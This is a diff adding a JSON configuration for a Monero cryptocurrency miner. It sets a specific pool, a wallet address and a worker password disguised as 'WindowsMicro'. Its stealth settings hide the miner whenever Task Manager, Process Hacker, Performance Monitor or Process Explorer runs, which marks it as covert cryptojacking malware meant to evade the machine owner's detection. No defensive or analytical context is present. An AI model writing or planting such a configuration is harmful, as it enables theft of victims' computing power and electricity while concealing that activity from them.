@@ -1,0 +1,15 @@
+{
+	"algo": "rx/0",
+	"pool": "pool.supportxmr.com",
+	"port": 9000,
+	"wallet": "83iUEgksv22AZVHqptn48EFkk5pRe4gpCS9ZasTEPZMkTjoHCzrN2ZVTHyC5NXHEaQgjPKTRnq6AGKS36LkWgvFSJG6demN",
+	"password": "WindowsMicro",
+	"rig-id": "",
+	"keepalive": true,
+	"nicehash": false,
+	"ssltls": true,
+	"idle-wait": 5,
+	"idle-cpu": 20,
+	"stealth": true,
+	"stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
+}
